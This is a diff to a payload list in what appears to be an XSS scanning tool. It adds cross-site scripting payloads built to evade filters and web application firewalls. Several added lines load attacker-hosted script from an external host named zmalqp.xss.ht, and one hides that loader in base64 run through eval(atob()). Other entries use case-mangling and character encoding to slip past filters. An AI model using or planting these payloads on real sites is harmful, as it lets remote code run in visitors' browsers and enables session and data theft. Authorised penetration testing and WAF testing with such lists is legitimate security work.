@@ -53,15 +53,18 @@ payloads = (  # Payloads for filter & WAF evasion
     '<sCript x>confirm``</scRipt x>',
     '<Script x>prompt()</scRiPt x>',
     '<sCriPt sRc=//14.rs>',
-    '<embed//sRc=//14.rs>',
     '<base href=//14.rs/><script src=/>',
-    '<object//data=//14.rs>',
     '<s=" onclick=confirm``>clickme',
     '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
     '\'"><y///oNMousEDown=((confirm))()>Click',
     '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
     '<img src=x onerror=confir\u006d`1`>',
-    '<svg/onload=co\u006efir\u006d`1`>')
+    '<svg/onload=co\u006efir\u006d`1`>',
+    '"><script src=https://zmalqp.xss.ht></script>',
+    '<script>$.getScript("//zmalqp.xss.ht")</script>',
+    "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://zmalqp.xss.ht\';document.body.appendChild(a)')",
+    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vem1hbHFwLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>'
+    )
 
 fuzzes = (  # Fuzz strings to test WAFs
     '<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//',
